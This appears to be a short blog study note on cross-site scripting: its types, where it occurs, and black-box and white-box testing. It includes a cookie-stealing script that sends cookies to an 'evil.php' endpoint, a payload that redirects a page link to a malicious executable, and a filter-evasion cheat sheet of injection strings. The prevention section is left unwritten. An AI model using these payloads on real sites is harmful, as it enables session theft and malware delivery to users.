---
title: Cross-site Scripting
date: 2018-09-12 01:41:46
tags: XSS
categories: Injection
---

## Common occurrences of vulnerabilities
The data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.
**Typical examples**
* User/Profiles page
* Shopping cart
* File Manager
* Application settings/preferences
* Forum/Message board
* Blog
* Log

## Type
* Stored XSS Attacks
These are those where the injected script is permanently stored on the target servers, such as in a database, in a message, in a message forum, visitor log, comment field, etc.

* Reflected XSS Attacks
These are those where the injected script is reflected directly off the web server when the request is sent.
<!--more-->

* DOM XSS Attacks
DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write).

## Use of Vulnerabilities
**Cookie Grabber**
```
<script>
Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);
var img = document.createElement(“img”);
var d1 = document.getElementById(“d1”);
img.src = adr;
d1.appendChild(img);
</script>
```

**Download of malicious software**
```
http://example.com/index.php?id=<script>window.onload = function() {
var AllLinks=document.getELementByTagName("a");
AllLinks[0].href = "http://badexample.com/malicious.exe";
}</script>
```

## Testing of Cross site scripting
**Reflected XSS**
*Black Box testing*
* `<script>alert(123)</script>`
* `“><script>alert(document.cookie)</script>`
1. Detect input vectors.
2. Use one of the examples showed above to be input data in every input vector, then examine the resulting web page HTML and search for the test input.

**Stored XSS**
*Black Box testing*
It's similar to the process. We can exploit Stored XSS by some advanced 
exploitation framework(Beff, XSS Proxy).

*White Box testing*
The predefined variables/functions to store input from HTTP GET and POST 
requests need to be focus.
* PHP
>$_GET -- HTTP GET variables
>$_POST -- HTTP POST variables
>$_REQUEST -- HTTP POST, GET and COOKIE variables
>$_FILES -- HTTP File Upload variables

* ASP
>Request.QueryString -- HTTP GET
>Request.Form -- HTTP POST
>Server.CreateObject -- Used to upload files

* JSP
>doGet, doPost servlets -- HTTP GET and POST
>request.getParameter -- HTTP GET/POST variables

**DOM XSS**
*White Box testing*
The API need to be concerned are the following
>document.location
>document.URL
>document.referrer
>window.location
>document.write
>document.writeln
>document.body.innerHTML
>eval

and so on.

## XSS Filter Evasion Cheat Sheet
Image tag
`<IMG SRC="javascript:alert('XSS');">`
No quotes and no semicolon
`<IMG SRC=javascript:alert('XSS')>`
Case insensitive
`<IMG SRC=JaVaScRiPt:alert('XSS')>`
HTML entities
`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`
Grave accent obfuscation
<code><IMG SRC=\`javascript:alert("RSnake says, 'XSS'")\`></code>
Malformed A tags
`<a onmouseover="alert(document.cookie)">xxs link</a>`
Malformed IMG tags
`<IMG src="""><SCRIPT>alert("XSS")</SCRIPT>">`
fromCharCode
`<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>`

# To be continue
## XSS Prevention Cheat Sheet

